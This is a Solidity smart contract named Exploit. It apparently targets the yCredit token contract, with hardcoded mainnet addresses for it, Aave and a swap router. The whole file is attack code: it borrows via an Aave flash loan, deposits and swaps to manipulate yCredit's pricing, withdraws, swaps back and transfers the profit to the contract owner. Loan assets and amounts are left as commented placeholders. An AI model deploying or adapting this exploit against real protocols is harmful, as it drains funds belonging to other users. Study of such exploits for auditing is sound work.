pragma solidity ^0.7.5;

import { FlashLoanReceiverBase } from "./FlashLoanReceiverBase.sol";
import { ILendingPool } from "./ILendingPool.sol";
import { ILendingPoolAddressProvider } from "./ILendingPoolAddressProvider.sol";
import { IERC20 } from "./IERC20.sol";

import { IERC20 } from "./IERC20.sol";

interface yCredit {
    function deposit(address token, uint amount) external;
    function withdraw(address token, uint amount) external;
}

interface Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

contract Exploit {
    address immutable owner;
    address constant aave = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;
    Router constant router = Router(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);
    address constant factory = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;
    address constant ycredit = 0xE0839f9b9688a77924208aD509e29952dc660261;
    address constant LENDING_POOL = 0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9;

    constructor() public {
        owner = msg.sender;
    }

    function executeOperation(
        address[] calldata assets,
        uint256[] calldata amounts,
        uint256[] calldata premiums,
        address initiator,
        bytes calldata params
    )
        public
        returns (bool)
    {
        address[] memory path = new address[](2);
        for (uint i = 0; i < assets.length; i++) {
            // aave borrow

            // 1. deposit asset to ycredit
            IERC20(assets[i]).approve(ycredit, amounts[i] / 2);
            yCredit(ycredit).deposit(assets[i], amounts[i] / 2);
            // 2. swap to ycredit
            path[0] = assets[i];
            path[1] = ycredit;
            IERC20(assets[i]).approve(address(router), amounts[i] / 2);
            router.swapExactTokensForTokens(amounts[i] / 2, 0, path, address(this), block.timestamp);
            // 3. withdraw from ycredit
            yCredit(ycredit).withdraw(assets[i], IERC20(ycredit).balanceOf(address(this)));
            // 4. swap ycredit to asset
            path[0] = ycredit;
            path[1] = assets[i];
            uint amountIn = IERC20(ycredit).balanceOf(address(this));
            IERC20(ycredit).approve(address(router), amountIn);
            router.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);
            // 5. return the profits
            uint profit = IERC20(assets[i]).balanceOf(address(this)) - amounts[i] - premiums[i];
            IERC20(assets[i]).transfer(owner, profit);
            // 6. return the flash loan
            IERC20(assets[i]).approve(address(aave), amounts[i] + premiums[i]);
        }
        return true;
    }

    function myFlashLoanCall() public {
        address receiverAddress = address(this);

        address[] memory assets = new address[](2);
        // assets[0] = address(INSERT_ASSET_ONE_ADDRESS);
        // assets[1] = address(INSERT_ASSET_TWO_ADDRESS);

        uint256[] memory amounts = new uint256[](2);
        // amounts[0] = INSERT_ASSET_ONE_AMOUNT;
        // amounts[1] = INSERT_ASSET_TWO_AMOUNT;

        // 0 = no debt, 1 = stable, 2 = variable
        uint256[] memory modes = new uint256[](2);
        // modes[0] = INSERT_ASSET_ONE_MODE;
        // modes[1] = INSERT_ASSET_TWO_MODE;

        address onBehalfOf = address(this);
        bytes memory params = "";
        uint16 referralCode = 0;

        ILendingPool(LENDING_POOL).flashLoan(
            receiverAddress,
            assets,
            amounts,
            modes,
            onBehalfOf,
            params,
            referralCode
        );
    }
}
